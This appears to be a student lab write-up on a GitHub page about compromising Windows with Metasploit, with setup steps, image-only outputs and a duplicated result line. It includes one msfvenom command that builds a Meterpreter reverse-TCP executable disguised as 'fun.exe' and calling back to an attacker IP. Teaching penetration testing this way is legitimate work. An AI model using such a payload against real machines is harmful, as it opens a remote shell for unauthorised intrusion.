# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:



<img width="1017" height="833" alt="image" src="https://github.com/user-attachments/assets/207fc825-3f73-4be9-8d30-f990d72b9af7" />


<img width="652" height="221" alt="Screenshot 2025-10-30 093541" src="https://github.com/user-attachments/assets/06b8a74f-d2d1-4ca8-bf5b-54b289f8f7ba" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:




<img width="678" height="383" alt="image" src="https://github.com/user-attachments/assets/9dd5a48d-1763-4f6b-b70e-9a3f5e41e3a0" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
